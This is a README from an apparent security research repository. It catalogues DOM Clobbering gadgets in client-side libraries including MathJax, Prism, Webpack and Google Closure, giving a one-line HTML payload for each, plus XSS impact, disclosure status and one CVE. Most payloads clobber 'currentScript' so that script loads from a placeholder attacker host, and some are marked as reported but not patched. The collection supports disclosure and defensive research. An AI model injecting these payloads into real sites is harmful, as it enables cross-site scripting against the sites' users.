# DOM Clobbering Collection

In this repo, we collect a list of client-side libraries that are either vulnerable to HTML injection or contain DOM Clobbering gadgets that lead to severe consequences, e.g., XSS.

## DOM Clobbering Gadgets

| Library | Stars | Version | Payloads | Impact | Found By | Status | CVE |
|:-------:|:-----:|:-------:|----------|:------:|:--------:|:------:|:---:|
| [AddToAny](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/addtoany.md) | N/A |N/A | ```<img src="https://addtoany.xxx.xxx" name="currentScript">``` | XSS | TheHulk | Patched | N/A |
| [doomcaptcha](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/doomcaptcha.md) | 1K |latest | ```<img name="currentScript" label="<script>alert(1)</script>"></img>``` | XSS | TheHulk | Mitre | N/A |
| [Google Client API](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/google-client-api.md) | N/A |5BIk7BglYEE | ```<iframe name="scripts" src=”https://apis.google.com/js/api.js”></iframe><iframe name="scripts" src=”https://apis.google.com/js/api.js”>alert(1)</iframe>``` | XSS | TheHulk | Patched | N/A |
| [Google Closure](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/google-closure-library.md) | 4.9K |v20230103 | ```<img name="currentScript" src="https://xxx.xxx.xxx/base.js"></img>``` | XSS | TheHulk | Reported | N/A |
| [inspire.js](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/inspire.js.md) | 1.7k |v1.10 | ```<img name="currentScript" src="https://xxx.xxxx.xxx"></img>``` | XSS | TheHulk | Reported | N/A |
| [MathJax](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/mathjax.md) | 10.1K |v2.7.x | ```<a id="MathJax"></a> <a id="MathJax" name="root" href="https://xxx.xxx.xxx"></a>``` | XSS | TheHulk | Reported | N/A |
| [MathJax](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/mathjax3.md) | 10.1K |v3.2.2 | ```<img name="currentScript" src="https://xxx.xxxx.xxx"></img> $$\require{tex}$$``` | XSS | TheHulk | Reported | N/A |
| [Mavo](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/mavo.md) | 2.8k |v0.3.2 | ```<img name="currentScript" src="https://xxx.xxxx.xxx"></img>``` | XSS | TheHulk | Reported | N/A |
| [pagefind](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/pagefind.md) | 3.3K |v1.1.0 | ```<img name="currentScript" src="blob:https://xxx.xxx.xxx/ui.js"></img>``` | XSS | TheHulk | Reported | N/A |
| [polyfills](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/polyfills.md) | 1.1K |v2.8.0 | ```<a id="ShadyDOM"></a><a id="ShadyDOM" name="force"></a><a id="WebComponents"></a><a id="WebComponents" name="root" href="https://xxx.xxx.xxx"></a>``` | XSS | TheHulk | N/A | N/A |
| [Prism](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/prism.md) | 12.2K |v1.29.0 | ```<img name="currentScript" src="https://xxx.xxx.xxx/a.js"></img>``` | XSS | TheHulk | Reported | N/A |
| [rspack](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/rspack.md) | 8.6K |v1.0.0-rc.0 | ```<img name="currentScript" src="https://xxx.xxxx.xxx"></img>``` | XSS | TheHulk | N/A | N/A |
| [Stage.js](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/stage.js.md) | 2.4K |v1-alpha | ```<img name="currentScript" src="https://xxx.xxxx.xxx"></img>``` | XSS | TheHulk | Reported | N/A |
| [steal](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/steal.md) | 1.4K |v2.3.0 | ```<img name="currentScript" src="https://xxx.xxx.xxx"><img>``` | XSS | TheHulk | Mitre | N/A |
| [tsup](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/tsup.md) | N/A |N/A | ```<img src="https://xxx.xxx.xxx" name="currentScript">``` | XSS | TheHulk | N/A | N/A |
| [Webpack](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/webpack.md) | 64.4K |v5.93.0 | ```<img name="currentScript" src="https://xxx.xxxx.xxx"></img>``` | XSS | TheHulk | Patched | CVE-2024-43788 |
